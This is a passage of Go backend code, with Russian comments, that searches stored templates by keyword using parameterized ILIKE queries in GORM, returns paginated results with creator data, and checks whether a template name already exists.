	if query != """" {
		for i, column := range allowedFields {
			if i > 0 {
				sb.WriteString("" OR "")
			}

			if column == ""markers"" {
				// для поля markers используем jsonb операции для поиска внутри JSON
				sb.WriteString(""markers::text ILIKE ?"")
			} else {
				sb.WriteString(column + "" ILIKE ?"")
			}
			values = append(values, ""%""+query+""%"")
		}
	}
	querySQL := sb.String()

	err := database.OpenReadTransaction(func(tx *gorm.DB) error {
		txWithFilters := tx.Model(&models.Template{})
		if querySQL != """" {
			txWithFilters = txWithFilters.Where(querySQL, values...)
		}

		if err := txWithFilters.Count(&totalCount).Error; err != nil {
			return fmt.Errorf(""ошибка подсчёта шаблонов: %w"", err)
		}

		txWithFilters = txWithFilters.Scopes(scopes.PreloadCreator).
			Order(""updated_at DESC"").
			Limit(limit).
			Offset(offset)
		if err := txWithFilters.Find(&templates).Error; err != nil {
			return fmt.Errorf(""ошибка загрузки шаблонов: %w"", err)
		}

		for i := range templates {
			templates[i].Creator.DepartmentUserToDepartmentWithTitle()
		}

		return nil
	})

	if err != nil {
		return models.TemplatesResponse{}, err
	}

	return models.TemplatesResponse{
		Templates:  templates,
		TotalCount: totalCount,
		Page:       page,
		Limit:      limit,
	}, nil
}

// TemplateExistsByName проверяет, существует ли шаблон с таким именем
func TemplateExistsByName(name string) (bool, error) {
	var count int64

	err := database.OpenReadTransaction(func(tx *gorm.DB) error {
		if err := tx.Model(&models.Template{}).
			Where(""name = ?"", name).
			Count(&count).Error; err != nil {
			return fmt.Errorf(""ошибка при проверке существования шаблона: %w"", err)
		}
		return nil
	})

	if err != nil {
		return false, err
	}

	return count > 0, nil
}
"
